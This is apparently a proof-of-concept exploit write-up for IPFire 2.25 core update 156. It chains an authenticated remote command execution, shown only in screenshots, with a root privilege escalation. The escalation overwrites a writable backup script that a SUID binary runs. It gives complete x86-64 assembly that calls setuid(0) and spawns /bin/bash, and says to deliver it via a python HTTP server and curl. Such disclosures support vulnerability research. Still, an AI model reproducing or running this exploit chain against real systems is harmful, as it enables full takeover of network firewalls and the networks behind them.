# Ipfire 2-25 (core update 156) authenticated rce

- system run command when install any packet
![packfileinstallation](https://user-images.githubusercontent.com/29048982/118332497-ddca6600-b512-11eb-800d-743975184dc6.png)

- system getting 7zip from just html

![pocpc0](https://user-images.githubusercontent.com/29048982/118332642-15391280-b513-11eb-9b6a-0465443ea6b7.png)

- and check the tmp directory

![pocpc1](https://user-images.githubusercontent.com/29048982/118332771-4dd8ec00-b513-11eb-8931-39fb4e84c8e2.png)

- version 2.25 - core update 156

![version](https://user-images.githubusercontent.com/29048982/118335575-a1016d80-b518-11eb-961b-d51230f45b96.png)

- ipfire allows run arbitrary os command as nobody after login

# Be root!

- check the suid binaries

![find-suid](https://user-images.githubusercontent.com/29048982/118407493-aa5e1780-b689-11eb-86a9-1ded561508d2.png)

- backup program run another script. /var/ipfire/backup/bin/backup.pl (it is a bash script and permission is looky good)

![backup-tespiti](https://user-images.githubusercontent.com/29048982/118407546-ded1d380-b689-11eb-8f43-d30bcab0765e.png)

- try the write in to bash script. (No error. GOOD!)

![yazma-denemesi](https://user-images.githubusercontent.com/29048982/118407615-38d29900-b68a-11eb-939e-c8d6310d1389.png)

- try run bash

![yazabilme-kanıtı](https://user-images.githubusercontent.com/29048982/118407649-661f4700-b68a-11eb-8a8b-a249ec483730.png)

- yes. we can run but it is low-privegled. we must trig to setuid(0)!
- save this and run ```alti name.asm q```
- alti is my own compile-check program in soo_deep repo.

```py
bits 64
section .data
  string db "/bin/bash",0x00
  olmadis db "basarisiz.",0x0a,0x00
  olmadil equ $-olmadis
section .text
  global main
main:
  mov rax,105
  mov rdi,0
  syscall
  cmp rax,0
  je getbash

  mov rax,1
  mov rdi,1
  mov rsi,olmadis
  mov rdx,olmadil
  syscall

  mov rax,60
  xor rdi,rdi
  syscall

getbash:
  mov rax,59
  mov rdi,string
  mov rsi,0
  mov rdx,0
  syscall
```

- and write the new program to /var/ipfire/backup/bin/backup.pl. (we can python http server and curl to write)

- and enjoy the root shell!

![image](https://user-images.githubusercontent.com/29048982/118408035-5274e000-b68c-11eb-8e1f-ec2eec6aaf2b.png)

